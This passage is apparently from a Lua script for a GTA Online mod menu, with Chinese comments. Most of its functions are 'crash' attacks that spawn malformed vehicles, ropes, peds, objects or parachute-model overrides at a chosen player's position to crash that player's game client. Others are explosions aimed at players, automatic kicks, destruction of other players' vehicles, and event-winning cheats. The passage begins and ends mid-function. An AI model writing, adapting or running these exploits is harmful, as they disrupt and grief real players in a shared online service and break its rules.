                ENTITY.SET_ENTITY_VISIBLE(veh2, true, 0)
                util.yield(100)				
                ENTITY.DETACH_ENTITY(veh1, true, true)		
                ENTITY.DETACH_ENTITY(obj1, true, true)
            end
        end
    end
end
--无效直升机崩溃
function Invalid_heli_protect(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local mdl = util.joaat("a_m_y_stlat_01")
    local veh_mdl = util.joaat ("dilettante")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    local playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

    local veh = create_vehicle(veh_mdl, pos.x, pos.y, pos.z, 0)
    local ped = create_ped(2, mdl, pos.x, pos.y, pos.z, 0)
    PED.SET_PED_INTO_VEHICLE(ped, veh, -1)
    util.yield (1000)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped, veh, PLAYER.GET_PLAYER_PED(pid), INT_MAX, 0, INT_MAX, 0, 0)
end
----火车崩溃
function train_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    local model_array = {184361638,3186376089,410882957,1077420264,240201337}
    local spawn_veh = {}
    for _, hash in pairs(model_array) do
        for i = 1, 15 do
            local veh = create_vehicle(hash, pos.x, pos.y, pos.z, 0)
            spawn_veh[#spawn_veh+1] = veh
            ENTITY.FREEZE_ENTITY_POSITION(veh, true)
        end
    end
    util.yield(5000)
    for _, ent in pairs(spawn_veh) do
        delete_entity(ent)
        util.yield()
    end
    STREAMING.CLEAR_FOCUS()
end
----动画崩溃
function anim_dict_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid),false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),false)
    local anim_dict = ("anim@mp_ferris_wheel")
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, false, false, false)
    request_anim_dict(anim_dict)
    TASK.TASK_SWEEP_AIM_ENTITY(PLAYER.PLAYER_PED_ID(), anim_dict, "get", "fucked", "retard", -1, PLAYER.GET_PLAYER_PED(pid), 30.0, 30.0)
end
----动画崩溃2
function anim_dict_crash2(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid),false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),false)
    local anim_dict = ("anim@mp_player_intupperstinker")
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, false, false, false)
    request_anim_dict(anim_dict)
    TASK.TASK_SWEEP_AIM_POSITION(PLAYER.PLAYER_PED_ID(), anim_dict, "get", "fucked", "retard", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
    util.yield(750)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
end

----无效爆炸
function Invalid_explosion(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    local chop = util.joaat('cs_taostranslator')
    local chup = util.joaat('A_C_Rabbit_02')

    local achop = create_ped(26, chop, pos.x, pos.y, pos.z, 0)
    ENTITY.SET_ENTITY_VISIBLE(achop,false)
    WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_mg'), 9999, false, false)
    TASK.TASK_COMBAT_PED(achop, PLAYER.GET_PLAYER_PED(pid), 0, 16)
    PED.SET_PED_COMBAT_ATTRIBUTES(achop, 46, true)
    PED.SET_PED_COMBAT_RANGE(achop, 4)
    PED.SET_PED_COMBAT_ABILITY(achop, 3)
    local cchop = create_ped(26, chup, pos.x, pos.y, pos.z, 0)
    WEAPON.GIVE_WEAPON_TO_PED(cchop, util.joaat('weapon_mg'), 9999, false, false)
    TASK.TASK_COMBAT_PED(cchop, PLAYER.GET_PLAYER_PED(pid), 0, 16)
    PED.SET_PED_COMBAT_ATTRIBUTES(cchop, 46, true)
    PED.SET_PED_COMBAT_RANGE(cchop, 4)
    PED.SET_PED_COMBAT_ABILITY(cchop, 3)

    util.yield(1700)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1, true, false, 0, false)
end


----任务载具崩溃
function task_veh_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid);
    if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 16, 100)
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 17, 100)
        TASK.TASK_VEHICLE_TEMP_ACTION(ped, vehicle, 18, 100)
    else
        util.toast("玩家不在载具")
    end
end

----无效实体崩溃
function Invalid_entcrash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ent = {}
    for i = 1, 5 do
        local hash = 0x9CF21E0F
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
        ent[#ent + 1] = create_object(hash, pos.x, pos.y, pos.z)
        util.yield(200)
    end
    util.yield(2000)
    for k, v in pairs(ent) do
        delete_entity(v)
    end
    util.toast("崩溃结束")
end

----道具草崩溃
function prop_grass(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    for i = 1, 30 do
        local ped = PLAYER.GET_PLAYER_PED(pid)
        if ped ~= 0 then
            local hash = util.joaat("prop_tall_grass_ba")
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local obj = create_object(hash, pos.x, pos.y, pos.z)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(obj, pos.x, pos.y, pos.z, false, true, true)
            util.yield(500)
            delete_entity(obj)
        end
    end
end

----PED崩溃
function PED_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0)
    local ped = create_ped(26,util.joaat("a_c_rat"),pos.x, pos.y, pos.z, 0)
    local plane = create_vehicle(0x9c5e5644, pos.x, pos.y, pos.z, 0)
    PED.SET_PED_INTO_VEHICLE(ped, plane, -1)
    ENTITY.FREEZE_ENTITY_POSITION(plane,true)
    TASK.TASK_OPEN_VEHICLE_DOOR(ped, plane, 9999, -1, 2)
    TASK.TASK_LEAVE_VEHICLE(ped, plane, 0)
    util.yield(50)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1, true, false, 0, false)
    delete_entity(ped)
end

----无效绳索崩溃
function Invalid_rope(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
    local Pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local cargobob = create_vehicle(0XFCFCB68B, Pos.x, Pos.y, Pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local vehicle = create_vehicle(0X187D938D, Pos.x, Pos.y, Pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
    local newRope = PHYSICS.ADD_ROPE(Pos.x, Pos.y, Pos.z, 0, 0, 10, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
end

----新鬼崩
function new_guibeng(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local fuck_ped = create_ped(26 , util.joaat("ig_kaylee"), pos.x, pos.y, pos.z, 0)
    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
    for i = 1, 3, 1 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, pos.x, pos.y, pos.z)
        for spawn, value in pairs(model_array) do
            local vels = {}
            vels[spawn] = create_vehicle(value, pos.x, pos.y, pos.z, 0)
            for attach, v in pairs(vels) do
                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(v, fuck_ped, 0, 0, true, true)
            end
        end
        util.yield(100)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 4, 100, true, false, 1, false)
    end
end

----大自然全局崩溃
function nature()
    local user = PLAYER.PLAYER_ID()
    local user_ped = PLAYER.PLAYER_PED_ID()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(25)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        local pos = players.get_position(user)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
end




----火人
local looped_ptfxs = {}
function fireself(on)
    if on then
        request_ptfx_asset("core")
        local trail_bones = {0xffa, 0xfa11, 0x83c, 0x512d, 0x796e, 0xb3fe, 0x3fcf, 0x58b7, 0xbb0}
        for _, bone in pairs(trail_bones) do
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            local bone_id = PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone)
            local fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", PLAYER.PLAYER_PED_ID(), 0.0, 0.0, 0.0, 0.0, 0.0, 90.0, bone_id, 0.5, false, false, false, 0, 0, 0, 0)
            looped_ptfxs[#looped_ptfxs+1] = fx
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, 0)
        end
    else
        for _, p in pairs(looped_ptfxs) do
            GRAPHICS.REMOVE_PARTICLE_FX(p, false)
            GRAPHICS.STOP_PARTICLE_FX_LOOPED(p, false)
        end
    end
end

----自动踢出广告机
chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
    if kick_adBot and sender ~= PLAYER.PLAYER_ID() and players.get_host() == PLAYER.PLAYER_ID() then

        local newtext = string.lower(text)--转小写
        local name = PLAYER.GET_PLAYER_NAME(sender)

        local dir = filesystem.scripts_dir() .. 'daidaiScript/adwords.json'
        local data = fileread(dir, 'r', '*all')
        local adwords = JsonToTable(data)
        
        for _, word in pairs(adwords) do 
            if string.contains(newtext, word) then
                util.toast("检测到广告机 "..name)
                util.log("检测到广告机 "..name)
                menu.trigger_commands("kick " .. name)
            end
        end
    end
end)


---MK-2拦截
local selectedKarmaMK2 = "[Remove]"
local oppressorFriendKarma = false
local oppressorYourselfKarma = false
function set_mk2_friend(on)
    oppressorFriendKarma = on
end
function set_mk2_self(on)
    oppressorYourselfKarma = on
end
function set_mk2_select(value)
    selectedKarmaMK2 = gm[value]
end
function is_player_friend(pId)
    local pHandle = memory.alloc(104)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pId, pHandle, 13)
    local isFriend = NETWORK.NETWORK_IS_HANDLE_VALID(pHandle, 13) and NETWORK.NETWORK_IS_FRIEND(pHandle)
    return isFriend
end
function oppKarma()
    for i, pid in pairs(players.list(true, true, true)) do
        if not oppressorFriendKarma and is_player_friend(pid) then
            pid = pid+1
        elseif not oppressorYourselfKarma and pid == PLAYER.PLAYER_ID() then
            pid = pid+1
        end
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), false)
        if ENTITY.GET_ENTITY_MODEL(vehicle) == 2069146067 and PED.IS_PED_IN_ANY_VEHICLE(PLAYER.GET_PLAYER_PED(pid),true) then
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            if selectedKarmaMK2 == "[Remove]" then
                request_control(vehicle)
                delete_entity(vehicle)
                util.yield(100)
            elseif selectedKarmaMK2 == "[Kill]" then
                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 100, true, false, 1, false)
            elseif selectedKarmaMK2 == "[Remove + Kill]" then
                request_control(vehicle)
                delete_entity(vehicle)
                FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 100, true, false, 1, false)
                util.yield(100)
            end
            notify("检测到马克兔 "..players.get_name(pid).." 报应启用")
        end
        util.yield(10)
    end
end


----自动杀死附近NPC
function auto_kill_NPC()
    for i, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) and ENTITY.DOES_ENTITY_EXIST(ped) then
            ENTITY.SET_ENTITY_HEALTH(ped, 0.0)
        end
    end
end
----自动杀死敌人
function auto_kill_enemy()
    for i, ped in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ped) and PED.IS_PED_IN_COMBAT(ped, PLAYER.PLAYER_ID()) then
            ENTITY.SET_ENTITY_HEALTH(ped, 0.0)
        end
    end
end

----过渡传送
function transit_tp()
    local waypoint = get_waypoint_coords()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
    if vehicle ~= 0 then
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
    end
    STREAMING.SWITCH_TO_MULTI_FIRSTPART(PLAYER.PLAYER_PED_ID(), 8, 1)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("PM_WAIT")
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(4)
    repeat
        util.yield()
    until STREAMING.IS_SWITCH_TO_MULTI_FIRSTPART_FINISHED()
    if vehicle == 0 then
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), waypoint.x, waypoint.y, waypoint.z, false, false, false)
    else
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, waypoint.x, waypoint.y, waypoint.z, false, false, false)
    end
    STREAMING.SWITCH_TO_MULTI_SECONDPART(PLAYER.PLAYER_PED_ID())
    STREAMING.ALLOW_PLAYER_SWITCH_OUTRO() 
    repeat
        util.yield()
    until not STREAMING.IS_PLAYER_SWITCH_IN_PROGRESS()
    if vehicle == 0 then
        NETWORK.NETWORK_FADE_IN_ENTITY(PLAYER.PLAYER_PED_ID(), true, true)
    else
        NETWORK.NETWORK_FADE_IN_ENTITY(vehicle, true, true)
        NETWORK.NETWORK_FADE_IN_ENTITY(PLAYER.PLAYER_PED_ID(), true, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, true)
    end
    HUD.BUSYSPINNER_OFF()
end


----随机位置
function random_position()
    local waypoint = {x = math.random(-1794,2940), y = math.random(-3026,6298), z = math.random(0,800)}
    local pos= waypoint_coord(waypoint.x,waypoint.y,waypoint.z)
    ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), pos.x, pos.y, pos.z, false, false, false, false)
end

-----跳过下水道切割
function IS_HELP_MSG_DISPLAYED(label) -- Credit goes to jerry123#4508
    HUD.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(label)
    return HUD.END_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(0)
end
-----删除排水管
function DELETE_OBJECT_BY_HASH(hash)
    for _, ent in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(ent) == hash then
            delete_entity(ent)
        end
    end
end

----强制可见
function force_visible()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED(pid)
        if not ENTITY.IS_ENTITY_VISIBLE(ped) then
            ENTITY.SET_ENTITY_VISIBLE(ped, true)
        end
    end
end

----赢得刑事毁坏
function Win_criminal_damage()
    local car = util.joaat("Tezeract")
    for i = 1, 22 do
        local ent = create_vehicle(car, 0, 0, 0, 0)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), 0, 0, 0, "EXP_TAG_RCTANK_ROCKET", 100.0, false, false, 0.0)
        util.yield(50)
        delete_entity(ent)
    end
end
----赢得检查点
function Win_checkpoints()
    local dblip = HUD.GET_NEXT_BLIP_INFO_ID(431)
    local cdblip = HUD.GET_BLIP_COORDS(dblip)
    teleport(cdblip.x, cdblip.y, cdblip.z, false)
    util.yield(1500)
end

--aio崩溃
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
function aaaio(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if players.exists(pid) then
        local user = PLAYER.PLAYER_ID()
        local user_ped = PLAYER.PLAYER_PED_ID()
        local pos = players.get_position(user)

                util.yield(100)
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xFBF7D21F)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
                TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
                util.yield()
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
                util.yield(250)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
                util.yield(1000)
                for i = 1, 5 do
                    util.spoof_script("freemode", SYSTEM.WAIT)
                end
                ENTITY.SET_ENTITY_HEALTH(user_ped, 0, 0)
                NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)

    end
    if players.exists(pid) then
        local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
                end
                util.yield(0)
            end
    end 
    if players.exists(pid) then
        local time = util.current_time_millis() + 2000
            while time > util.current_time_millis() do
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
                for i = 1, 20 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                end
                util.yield()
            end	
    end
    if players.exists(pid) then
        local TPP = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()
        
        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end
    if players.exists(pid) then
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = getEntityCoords(getPlayerPed(pid))
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = getEntityCoords(getPlayerPed(pid))
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
    end
    if players.exists(pid) then	
            for pedp_crash = 2 , 6 do
        pedp = PLAYER.GET_PLAYER_PED(pid)
        pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        dune = create_vehicle(410882957,pos.x, pos.y, pos.z,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(dune, true)
        dune1 = create_vehicle(2971866336,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
        barracks = create_vehicle(3602674979,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
        barracks1 = create_vehicle(444583674,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
        dunecar = create_vehicle(2971866336,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
        dunecar1 = create_vehicle(3602674979,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
        dunecar2 = create_vehicle(444583674,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
        barracks3 = create_vehicle(4244420235,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
        barracks31 = create_vehicle(3602674979,pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
        util.yield(5000)
        for i = 0, 100  do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
                util.yield(10)
            end
            util.yield(2000)
            delete_entity(dune)
            delete_entity(dune1)
            delete_entity(barracks)
            delete_entity(barracks1)
            delete_entity(dunecar)
            delete_entity(dunecar1)
            delete_entity(dunecar2)
            delete_entity(barracks3)
            delete_entity(barracks31)
        end
    end
end

--大自然崩溃
function naturecrashv1(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local user = PLAYER.PLAYER_ID()
    local user_ped = PLAYER.PLAYER_PED_ID()
    local pos = players.get_position(user)

        util.yield(100)
        menu.trigger_commands("invisibility on")
            for i = 0, 110 do
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                util.yield(50)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            end
        util.yield(250)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        menu.trigger_commands("invisibility off")

end
--OX崩溃
function OXcrashgg(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local PED1 = create_ped(26,util.joaat("cs_beverly"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0) 
    util.yield(10000)
        delete_entity(PED1)
        if players.exists(pid) then
            util.toast("未能移除玩家,正在使用cs_fabien模型")
            local PED2 = create_ped(26,util.joaat("cs_fabien"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
            ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
                util.yield(100)
            WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
                util.yield(1000)
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
                util.yield(5000)
            delete_entity(PED2)
        end
    if players.exists(pid) then
        util.toast("未能移除玩家,正在使用cs_manuel模型")
        local PED3 = create_ped(26,util.joaat("cs_manuel"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
            util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
            util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
            util.yield(5000)
        delete_entity(PED3)
    end
    if players.exists(pid) then
